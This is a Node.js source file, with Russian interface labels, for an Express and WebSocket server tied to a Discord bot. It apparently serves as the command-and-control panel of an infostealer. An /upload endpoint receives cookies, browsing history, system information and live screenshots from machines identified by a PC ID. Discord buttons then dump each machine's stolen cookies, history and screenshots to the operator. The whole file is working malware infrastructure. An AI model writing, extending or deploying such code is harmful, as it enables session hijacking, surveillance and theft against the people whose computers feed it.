const express = require("express");
const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const bodyParser = require("body-parser");
const { WebSocketServer } = require("ws");

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";

const app = express();
app.use(bodyParser.json({ limit: "50mb" }));

// ---------- Discord ----------
const client = new Client({
  intents: [GatewayIntentBits.Guilds],
  partials: [Partials.Channel],
});

client.once("ready", () => {
  console.log(`Бот запущен как ${client.user.tag}`);
});

// ---------- Хранилище ----------
let onlinePCs = {}; // { pcId: { lastSeen, cookies, history, systemInfo, screenshot } }

// ---------- Веб-сокеты ----------
const wsClients = {};
const wss = new WebSocketServer({ noServer: true });

wss.on("connection", (ws, req) => {
  const urlParams = new URLSearchParams(req.url.replace("/?", ""));
  const pcId = urlParams.get("pcId");
  if (!pcId) return ws.close();

  if (!wsClients[pcId]) wsClients[pcId] = [];
  wsClients[pcId].push(ws);

  ws.on("close", () => {
    wsClients[pcId] = wsClients[pcId].filter(c => c !== ws);
  });
});

// ---------- Express + WS интеграция ----------
const server = app.listen(process.env.PORT || 3000, () =>
  console.log("Сервер запущен")
);
server.on("upgrade", (req, socket, head) => {
  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});

// ---------- Вспомогательные функции ----------
async function getOrCreateCategory(name) {
  const guild = await client.guilds.fetch(GUILD_ID);
  let category = guild.channels.cache.find(c => c.name === name && c.type === 4);
  if (!category) {
    category = await guild.channels.create({
      name,
      type: 4,
    });
  }
  return category.id;
}

async function getOrCreateTextChannel(name, categoryId) {
  const guild = await client.guilds.fetch(GUILD_ID);
  let channel = guild.channels.cache.find(c => c.name === name && c.type === 0);
  if (!channel) {
    channel = await guild.channels.create({
      name,
      type: 0,
      parent: categoryId,
    });
  }
  return channel.id;
}

async function sendControlButtons(pcId) {
  const categoryId = await getOrCreateCategory(CATEGORY_NAME);
  const pcChannelId = await getOrCreateTextChannel(pcId, categoryId);
  const channel = await client.channels.fetch(pcChannelId);

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`check_${pcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`cookies_${pcId}`).setLabel("Куки").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId(`history_${pcId}`).setLabel("История").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId(`system_${pcId}`).setLabel("Система").setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId(`screenshot_${pcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Danger),
  );

  await channel.send({ content: `Управление ПК: **${pcId}**`, components: [row] });
}

// ---------- REST API ----------
app.post("/upload", async (req, res) => {
  const { pcId, cookies, history, screenshot, systemInfo } = req.body;
  if (!pcId) return res.status(400).send("pcId обязателен");

  const isNewPC = !onlinePCs[pcId];
  onlinePCs[pcId] = {
    lastSeen: Date.now(),
    cookies: cookies || onlinePCs[pcId]?.cookies,
    history: history || onlinePCs[pcId]?.history,
    systemInfo: systemInfo || onlinePCs[pcId]?.systemInfo,
    screenshot: screenshot || onlinePCs[pcId]?.screenshot,
  };

  // рассылаем кадр через WS
  if (screenshot && wsClients[pcId]) {
    wsClients[pcId].forEach(ws => {
      if (ws.readyState === 1) ws.send(screenshot);
    });
  }

  // теперь кнопки отправляются всегда
  await sendControlButtons(pcId);

  res.send("OK");
});

// ---------- Команды Discord ----------
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  const [action, pcId] = interaction.customId.split("_");
  const pcData = onlinePCs[pcId];

  if (!pcData) return interaction.reply({ content: "Нет данных об этом ПК", ephemeral: true });

  if (action === "check") {
    const status = Date.now() - pcData.lastSeen < 15000 ? "🟢 Онлайн" : "🔴 Оффлайн";
    return interaction.reply({ content: `Статус ${pcId}: ${status}`, ephemeral: true });
  }
  if (action === "cookies") {
    return interaction.reply({ content: `Cookies: \`\`\`${pcData.cookies || "Нет"}\`\`\``, ephemeral: true });
  }
  if (action === "history") {
    return interaction.reply({ content: `История: \`\`\`${pcData.history || "Нет"}\`\`\``, ephemeral: true });
  }
  if (action === "system") {
    return interaction.reply({ content: `Система: \`\`\`${JSON.stringify(pcData.systemInfo || {}, null, 2)}\`\`\``, ephemeral: true });
  }
  if (action === "screenshot") {
    if (!pcData.screenshot) return interaction.reply({ content: "Скриншота нет", ephemeral: true });
    const buffer = Buffer.from(pcData.screenshot, "base64");
    return interaction.reply({ files: [{ attachment: buffer, name: `${pcId}.jpg` }], ephemeral: true });
  }
});

// ---------- Запуск ----------
client.login(DISCORD_BOT_TOKEN);
